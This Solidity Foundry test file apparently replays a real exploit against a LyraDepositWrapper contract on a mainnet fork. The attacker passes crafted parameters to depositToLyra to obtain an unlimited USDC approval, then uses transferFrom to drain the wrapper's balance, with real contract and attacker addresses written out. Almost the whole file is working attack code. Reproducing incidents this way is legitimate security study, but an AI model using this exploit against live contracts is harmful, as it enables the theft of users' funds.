// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";

interface ILyraDepositWrapper {
    function depositToLyra(
        address token,
        address socketVault,
        bool isSCW,
        uint256 amount,
        uint256 gasLimit,
        address connector
    ) external payable;
}

contract Exploit_LyraDepositWrapper is TestHarness, TokenBalanceTracker {
    
    address private constant ATTACKER =
        0x62005500Af4CFB0077AC0090002F630055Ba001D;
    ILyraDepositWrapper private constant LYRA_DEPOSIT_WRAPPER =
        ILyraDepositWrapper(0x18a0f3F937DD0FA150d152375aE5A4E941d1527b);

    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IWETH9 private constant WETH =
        IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function setUp() public {
        // Fork the chain one block before the exploit occurred
        cheat.createSelectFork(vm.envString("RPC_URL"), 23377072);

        deal(address(this), 0);
        // Set up token balance tracking for logging.
        addTokenToTracker(address(USDC));
    }

    function test_attack() public {
        console.log("------- INITIAL BALANCES -------");
        
        logBalancesWithLabel("Attacker", ATTACKER);
        logBalancesWithLabel(
            "LyraDepositWrapper",
            address(LYRA_DEPOSIT_WRAPPER)
        );
         uint256 initialWrapperBalance = USDC.balanceOf(
            address(LYRA_DEPOSIT_WRAPPER)
        );

        console.log(
            "\n------- STEP 1: Call depositToLyra with malicious parameters to gain approval -------"
        );
       
        vm.startPrank(ATTACKER);
        LYRA_DEPOSIT_WRAPPER.depositToLyra{value: 0}(
            address(USDC),
            ATTACKER, // socketVault: The address to grant approval
            false,    // isSCW
            0,        // allow amount zero 
            1,        // gasLimit
            address(WETH) // connector 
        );

        
        uint256 allowance = USDC.allowance(
            address(LYRA_DEPOSIT_WRAPPER),
            ATTACKER
        );
        assertEq(
            allowance,
            type(uint256).max,
            "Attacker should have max allowance"
        );
        console.log(
            "\n------- STEP 2: Use the approval to drain the contract's USDC balance -------"
        );
        // With the allowance granted, the attacker can now call `transferFrom` on the USDC
        uint256 balanceToDrain = USDC.balanceOf(address(LYRA_DEPOSIT_WRAPPER));
        USDC.transferFrom(
            address(LYRA_DEPOSIT_WRAPPER),
            ATTACKER,
            balanceToDrain 
        );

        console.log("\n------- FINAL STATE -------");
        logBalancesWithLabel("Attacker final balance", ATTACKER);
        logBalancesWithLabel(
            "LyraDepositWrapper final balance",
            address(LYRA_DEPOSIT_WRAPPER)
        );

        assertEq(
            USDC.balanceOf(address(LYRA_DEPOSIT_WRAPPER)),
            0,
            "Wrapper contract should be empty"
        );
        assertGe(
            USDC.balanceOf(ATTACKER),
            initialWrapperBalance,
            "Attacker should have drained the funds"
        );

    }
}
